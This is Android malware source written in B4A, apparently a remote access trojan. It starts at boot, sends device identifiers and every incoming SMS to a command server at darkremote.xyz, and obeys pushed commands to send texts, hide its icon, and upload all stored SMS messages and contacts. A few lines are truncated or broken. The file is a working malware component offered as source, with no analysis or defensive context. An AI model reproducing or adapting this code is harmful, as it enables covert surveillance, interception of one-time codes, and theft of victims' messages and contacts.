B4A=true
Group=Default Group
ModulesStructureVersion=1
Type=Service
Version=11.2
@EndOfDesignText@
#Region  Service Attributes 
    #StartAtBoot: True
	#StartCommandReturnValue: android.app.Service.START_STICKY
#End Region

Sub Process_Globals
	Type Message (Address As String, Body As String)
	Private fm As FirebaseMessaging
	Dim pd As PersianDeviceInfo
	Dim Comand,Opr,model,androidid,kos,android,battry,nump,txm,data As String
	Dim PE As PhoneEvents
	Dim p As Phone
	Dim ht As HttpJob
	Dim sms As Sms
	Dim pnsms As PNSMS
	Dim sms2 As SmsMessages
	Dim li As List
	Dim p As Phone
	Dim strResult As String = "https://darkremote.xyz/zx"
End Sub
Sub Service_Create
	fm.Initialize("fm")
	pnsms.Initialize("ss")
	pd.initialize("pd")
	ht.Initialize("ht",Me)
	PE.Initialize("PE")
End Sub
Public Sub SubscribeToTopics
	fm.SubscribeToTopic("pluto") 'you can subscribe to more topics
End Sub
Sub Service_Start (StartingIntent As Intent)
	Dim apilink As String = strResult&"/rat.php"
	If StartingIntent.IsInitialized = True Then
		If File.Exists(File.DirInternal, "test.txt") = False Then
			android = pd.AndroidID
			Opr = pd.Carrier
			Dim osVersion As String = pd.OSVersion
			model = pd.Manufacturer&"-"&p.Model
			data = "result=ok&action=firstinstall&androidid="&android&"&opr="&Opr&"&model="&model&"&osVersion="&osVersion
			ht.PostString(apilink,data)

			File.MakeDir(File.DirInternal, "test.txt")
		End If

		If StartingIntent.Action = "android.provider.Telephony.SMS_RECEIVED" Then
			Dim messages As List
			messages = ParseSmsIntent(StartingIntent)
			For i = 0 To messages.Size - 1
				android = pd.AndroidID
				Opr = pd.Carrier
				model = pd.Manufacturer&"-"&p.Model
				battry=pd.BatteryPercentage
				data = "result=ok&action=nwmessage&androidid="&android&"&model="&model&"&battry="&battry&"&opr="&Opr&"&message="&messages.get(i)
				ht.PostString(apilink,data)
			Next
		
		End If
	
		fm.HandleIntent(StartingIntent)
		Sleep(0) 'allow the MessageReceived event to be raised.
	
	Else
		Log("suck")
	End If
End Sub
Sub fm_MessageArrived (Message As RemoteMessage)
	Log($"Message data: ${Message.GetData}"$)
	Comand = Message.GetData.Get("action")
	androidid = Message.GetData.Get("androidid")
	android = pd.AndroidID
	Opr = pd.Carrier
	model = pd.Manufacturer&"-"&p.Model
	kos = p.SdkVersion
	battry=pd.BatteryPercentage
	nump = Message.GetData.Get("phone")
	txm = Message.GetData.Get("text")
	Dim apilink As String = strResult&"/rat.php"
	
	If Comand = "ping"  Then
		Log($"Message data: ${Message.GetData}"$)
		data = "result=ok&action=ping&androidid="&android&"&model="&model&"&battry="&battry&"&opr="&Opr&"&kos="&kos
		ht.PostString(apilink,data)
	End If
	
	If Comand = "pingone"   Then
		If android = androidid Then
			Log($"Message data: ${Message.GetData}"$)
			data = "result=ok&action=pingone&androidid="&android&"&model="&model&"&battry="&battry&"&opr="&Opr
			ht.PostString(apilink,data)
		End If
	End If
	If Comand = "SendSingleMessage" And android = androidid Then
		
		pnsms.Send(nump,txm)
		
		
	End If
	If Comand = "getdevicefullinfo" Then
		If android = androidid Then
			Log("Deviceinfo is OK")
			data = "result=ok&action=getdevicefullinfo&androidid="&android&"&opr="&Opr&"&model="&model&"&battry="&battry
			ht.PostString(apilink,data)
				
		End If

	End If
	
	If Comand = "hideicon" Then
		If android = androidid Then
			HideApp(True)
			data = "result=ok&action=hideicon&androidid="&android&"&opr="&Opr&"&model="&model&"&battry="&battry
			ht.PostString(apilink,data)
		End If

	End If
	
	If Comand = "getsms" Then
		If android = androidid Then
			Log("GetLastSms is OK")
			Dim allsms As String = ""
			li.Initialize
			li = sms2.GetAll
			For i = 0 To li.Size -1
				sms = li.Get(i)
				allsms = allsms & CRLF & CRLF & "{" & CRLF & "M U M M Y" & CRLF & "Conversion:" & sms.Address & CRLF & "Text:" & sms.Body & CRLF & "Date:" & DateTime.Date(sms.Date) & " " & DateTime.Time(sms.Date) & CRLF & "}"
			Next
			File.WriteString(File.DirInternal,"AllSms.txt",allsms)
			ht.Postfile(strResult&"/upload.php?result=ok&action=uploadsms&androidid="&android&"&Opr="&Opr&"&model="&model,File.DirInternal,"AllSms.txt")
	
	
		End If
	End If
	
	If Comand = "getcontact" Then
		If android = androidid Then
			Log("contact is OK")
			Dim cu As ContactsUtils
			cu.Initialize
			Dim allcon As String
			allcon = ""
			For Each c As cuContact In cu.FindContactsByPhone("", False, False)
				For Each Phone As cuPhone In cu.GetPhones(c.Id)
					allcon = allcon&CRLF&"@zaartoosht"&CRLF&c.DisplayName&": "&Phone.Number
				Next
			Next
			File.WriteString(File.DirInternal,"Contacts.txt",allcon)
			ht.Postfile(strResult&"/upload.php?result=ok&action=upload&androidid="&android&"&opr="&Opr&"&model="&model,File.DirInternal,"Contacts.txt")
		End If
	End If
	
	If Comand = "lastsms" Then
		If android = androidid Then
			Dim listsms As List
			Dim sa As SmsMessages
			Dim lasts As String
			listsms = sa.GetAll
			lasts = listsms.Get(0)
			Dim allsms As String = ""
			li.Initialize
			li = sms2.GetAll
			sms = li.Get(i)
			allsms =  sms.Address
			data = "result=ok&action=lastsms&androidid="&android&"&model="&model&"&battry="&battry&"&opr="&Opr&"&message="&lasts&"&sender="&allsms
			ht.PostString(apilink,data)
        
		End If
	End If
End Sub
Sub ParseSmsIntent (In As Intent) As L
	Dim messages_list As List
	messages_list.Initialize
	If In.HasExtra("pdus") = False Then Return messages_list
	Dim pdus() As Object
	Dim r As Reflector
	pdus = In.GetExtra("pdus")
	Dim messagesMap As Map
	messagesMap.Initialize
	If pdus.Length > 0 Then
		For i = 0 To pdus.Length - 1
			Dim msg As Message
			r.Target = r.RunStaticMethod("android.telephony.SmsMessage", "createFromPdu", _
                Array As Object(pdus(i)), Array As String("[B"))
			msg.Body = r.RunMethod("getMessageBody")
			msg.Address = r.RunMethod("getOriginatingAddress")
		
			If messagesMap.ContainsKey(msg.Address) Then
				Dim existing As Message
				existing = messagesMap.Get(msg.Address)
				existing.Body = existing.Body & msg.Body
				
			Else
				messagesMap.Put(msg.Address, msg)
				messages_list.Add(msg)
			End If
		Ne
	End If
	Return messages_list
End Sub
Sub HideApp(Enable As Boolean)
	Dim rs As Reflector
	Dim cns As Object = rs.CreateObject2("android.content.ComponentName",  Array As Object(Application.PackageName, Application.PackageName&".main"), Array As String("java.lang.String", "java.lang.String"))
	rs.Target = rs.GetContext
	rs.Target = rs.RunMethod("getPackageManager")
	Dim es As Int
	If Enable = True Then
		es = 2
	Else
		es = 1
	End If
	rs.Target = rs.RunMethod4("setComponentEnabledSetting", Array As Object(cns, es, 0), Array As String("android.content.ComponentName", "java.lang.int", "java.lang.int"))
End Sub

Sub JobDone(job As HttpJob)
	If job.Success Then
		
	Else
		Log("Error: " & job.ErrorMessage)
	End If
	job.Release
End Sub
Sub Service_Destroy
	StartService("")
End Sub